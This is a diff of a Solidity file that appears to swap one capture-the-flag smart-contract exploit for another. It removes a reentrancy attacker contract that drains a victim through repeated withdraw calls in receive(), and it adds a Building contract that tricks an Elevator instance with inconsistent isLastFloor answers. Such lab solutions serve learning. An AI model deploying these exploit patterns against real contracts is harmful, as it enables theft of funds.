@@ -1,25 +1,25 @@
-//SPDX-License-Identifier: GPL-3.0
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
-pragma solidity >=0.7.0 <0.9.0;
-
-contract Attacker {
-
-address public victimAddr = 0x8462a0a70ff4dC244EDFBEF16C8e27F17220165b; //put your instance addrr
-
-
-function donate() payable external {
-        (bool success, ) = address(victimAddr).call{value: msg.value}(abi.encodeWithSelector(bytes4(keccak256("donate(address)")), address(this)));
-        require(success, "success donate");
+interface Elevator {
+  function goTo(uint) external; 
 }
 
-function startWithdraw() public {
-        uint amount = 0.001 ether;
-        (bool success, ) = address(victimAddr).call(abi.encodeWithSelector(bytes4(keccak256("withdraw(uint256)")), amount));
-        require(success, "success withdraw");
-}
-
-receive() external payable {
-       startWithdraw();
-}
-
+contract Building {
+    address instAddr = 0x794ccAB356c33BE110Bd4E29310D6b393aE04c77; //the addr of your instance
+    bool public firstCall = true;
+    
+    function isLastFloor(uint) public returns (bool) {
+        if(firstCall) { 
+            firstCall = false;
+            return false;
+        } else {
+            return true;
+        }
+    }
+    
+    function run() external {
+        Elevator el = Elevator(instAddr);
+        el.goTo(1);
+    }
 }
